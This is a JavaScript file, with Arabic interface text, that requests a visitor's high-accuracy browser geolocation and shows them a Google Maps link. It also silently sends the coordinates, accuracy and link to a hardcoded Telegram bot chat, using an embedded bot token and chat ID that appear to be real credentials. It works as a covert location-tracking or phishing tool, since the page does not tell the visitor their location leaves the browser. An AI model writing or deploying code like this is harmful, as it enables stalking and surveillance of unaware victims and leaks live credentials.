const TELEGRAM_BOT_TOKEN = '8997488272:AAHicDJAL-RqftodKvyVcCazyygIBcnLWc';
const TELEGRAM_CHAT_ID = '6694780096';

function requestLocation() {
    const statusDiv = document.getElementById('status');

    if (!navigator.geolocation) {
        statusDiv.innerHTML = "<p style='color:red;'>متصفحك لا يدعم تحديد الموقع الجغرافي.</p>";
        return;
    }

    statusDiv.innerHTML = "جاري التحميل...";

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = Math.round(position.coords.accuracy);

            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

            statusDiv.innerHTML = `
                <p style="color:green;"><strong>تم الحصول على الموقع بنجاح!</strong></p>
                <p><a href="${mapLink}" target="_blank" style="color:#007bff; font-weight:bold;">فتح الموقع على Google Maps 📍</a></p>
            `;

            sendToTelegram(lat, lon, accuracy, mapLink);
        },
        (error) => {
            statusDiv.innerHTML = "<p style='color:red;'>تعذر الحصول على الموقع.</p>";
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

function sendToTelegram(lat, lon, accuracy, mapLink) {
    const message = `🎯 **تم الموافقة على طلب الموقع!**\n\n📍 **خط العرض:** ${lat}\n📍 **خط الطول:** ${lon}\n🎯 **الدقة:** خلال ${accuracy} متر\n\n🔗 **رابط الخريطة:**\n${mapLink}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });
}

